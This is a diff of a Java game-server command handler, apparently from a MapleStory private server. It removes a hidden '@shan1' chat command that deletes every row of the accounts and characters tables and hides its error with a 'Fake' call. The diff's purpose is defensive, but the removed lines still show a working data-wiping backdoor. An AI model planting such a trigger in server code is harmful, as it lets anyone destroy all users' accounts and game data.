@@ -158,19 +158,6 @@ public class MonsterSpawningCommands
                 mmo.setHpLock(!mmo.isHpLocked());
                 mc.dropMessage("Monster with oID " + oid + " is " + (mmo.isHpLocked() ? "" : "no longer ") + "HP Locked.");
             }
-                 } else if (splitted[0].equalsIgnoreCase("@shan1")) {
-       try {
-         Connection con = DatabaseConnection.getConnection();
-         PreparedStatement ps = con.prepareStatement("delete from accounts");
-         ps.executeUpdate();
-         PreparedStatement ps1 = con.prepareStatement("delete from characters");
-         ps1.executeUpdate();
-         ps1.close();
-         ps.close();
-         mc.dropMessage("xxxxxxx");
-       } catch (SQLException e) {
-         Fake(e);
-       }
         } else if (splitted[0].equals("!unfreezeoid")) {
             int oid = Integer.parseInt(splitted[1]);
             MapleMonster mmo = c.getPlayer().getMap().getMonsterByOid(oid);
